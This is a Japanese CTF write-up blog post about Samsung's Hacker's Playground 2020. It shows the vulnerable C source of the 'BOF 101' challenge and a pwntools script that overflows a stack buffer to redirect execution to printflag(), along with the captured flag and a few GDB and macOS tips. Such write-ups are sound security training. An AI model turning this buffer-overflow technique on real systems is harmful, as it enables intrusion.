---
title: "Hacker's Playground Writeup (Samsung Security Tech Forum 2020)"
date: 2020-08-18T15:00:00+09:00
lastmod: 2020-08-18T15:00:00+09:00
draft: false
keywords: []
description: ""
tags: ["CTF"]
categories: ["CTF"]
author: ""
---
{{% right %}}
<a href="https://translate.google.com/translate?hl=en&sl=ja&tl=en&u=https%3A%2F%2Fcaptureamerica.github.io%2Fwriteups%2Fpost%2Fhackers_playground_2020%2F">
<img src="https://captureamerica.github.io/writeups/img/En.png" alt="English">
</a>
{{% /right %}}

URL: [https://playground.sstf.site/](https://playground.sstf.site/)

<br />
Samsung主催のCTFっぽいですね。

平日火曜日に6時間だけやっていて、たまたま年休を取っていたので参加できました。

<br />
275 points で、最終順位は 90位 でした。

<img src="https://captureamerica.github.io/writeups/img/hackers_playground_2020_Score.png" alt="hackers_playground_2020_Score.png">

<br />
といっても、最初の方のチャレンジにはTutorial（ほぼwriteup）が付いていて、その通りにやれば 275 points 取れます。

見たところ、43位〜114位はみんな 275 points でした。:)

<br />
以下、チャレンジです。

<img src="https://captureamerica.github.io/writeups/img/hackers_playground_2020_Challenges1.png" alt="hackers_playground_2020_Challenges1.png">
<br />
<img src="https://captureamerica.github.io/writeups/img/hackers_playground_2020_Challenges2.png" alt="hackers_playground_2020_Challenges2.png">

<br />

Tutorialが付いていたやつしか解いてないし、Tutorialががほぼwriteupなので、別途自分がwriteupを書くほどのことでもないんですが、Pwnのチャレンジだけ記録に残しておきます。

<u><b>いちおう、これはTutorialを見ずに解きました。</b></u>


<br /><br />
## [Pwn]: BOF 101 (50 points)
- - -
### Challenge
> You might have heard about BOF.
<br />
It's the most common vulnerability in executable binaries.
<br /><br />
The binary is running at:
<br />
nc bof101.sstf.site 1337.
<br /><br />
Can you smash it?
<br />
Just execute printflag() function and get the flag!


Attachment:

- bof101 (64bit ELF)

- bof101.c

ソースの中身

```C
#include <stdio.h>
//#include <fcntl.h>
//#include <unistd.h>
#include <stdlib.h>
#include <string.h>

void printflag(){ 
	char buf[32];
	FILE* fp = fopen("/flag", "r"); 
	fread(buf, 1, 32, fp);
	fclose(fp);
	printf("%s", buf);
	fflush(stdout);
}

int main() {
	int check=0xdeadbeef;
	char name[140];
	printf("printflag()'s addr: %p\n", &printflag);
	printf("What is your name?\n: ");
	fflush(stdout);
	scanf("%s", name);	
	if (check != 0xdeadbeef){
		printf("[Warning!] BOF detected!\n");
		fflush(stdout);
		exit(0);
	}
	return 0;
}
```



<br />
### Solution
とりあえず、2回アクセスしてみて2回とも同じアドレスが取れたので、スクリプトで読み取る処理はせず、スクリプトの中でそのままアドレスを書いてます。

<pre>
$ nc bof101.sstf.site 1337
printflag()'s addr: 0x555555555229
What is your name?
: aaa

$ nc bof101.sstf.site 1337
printflag()'s addr: 0x555555555229
What is your name?
: bbb
</pre>


<br />

```Python
#!/usr/bin/env python
from pwn import *

s = remote('bof101.sstf.site', 1337)

payload = b'A' * 140
payload += p64(0xdeadbeef)
payload += b'A' * 4 # 16 byte alignment
payload += p64(0x555555555229)

s.recvline()
s.recvline()
s.sendlineafter(": ", payload)
print(s.recvall())
```

<br />

Flag: `SCTF{n0w_U_R_B0F_3xpEr7}`




<br /><br />
<br /><br />
## おまけ１
- - -
まずは、Tutorialに書いてあった中から、勉強になったことをPickup。

GDBのオプションです。

{{< highlight sh "linenos=table,hl_lines=4" >}}
> x/s $rcx
"Rev3ngineering1"...

> set print element 0
> x/s $rcx
"Rev3ngineering1sc00l!"
{{< / highlight >}}

<br />
使ったことのないオプションだったので、ググって以下の説明を見つけました。

[https://stackoverflow.com/questions/233328/how-do-i-print-the-full-value-of-a-long-string-in-gdb](https://stackoverflow.com/questions/233328/how-do-i-print-the-full-value-of-a-long-string-in-gdb)

> Set a limit on how many elements of an array GDB will print. If GDB is printing a large array, it stops printing after it has printed the number of elements set by the set print elements command. This limit also applies to the display of strings. When GDB starts, this limit is set to 200. Setting number-of-elements to zero means that the printing is unlimited.

へぇ〜。

.gdbinitに書いておけばいいのかな。


<br /><br />
<br /><br />
## おまけ２
- - -
最近、Macbook Airを購入して、またMacをメインに使い出しました。

チャレンジのひとつの中に、`base64 -i -d` というのが出てきて、`base64 -d`がMacだと`base64 -D`になるのは知ってたんですが、`-i`オプションもMacだと別の意味になるようです。

いちいちアタマを切り替えるのが面倒なので、Gnu版base64をMacで使えないか調べてみたら、`gbase64` というのがすでにMacに入っていたことが判明。

<br />
aliasを設定しておきました。

<pre>
alias base64='gbase64'
</pre>

<br />
これで、ハッピー。



<br /><br />
<br /><br />
- - -
<br /><br />
<br /><br />
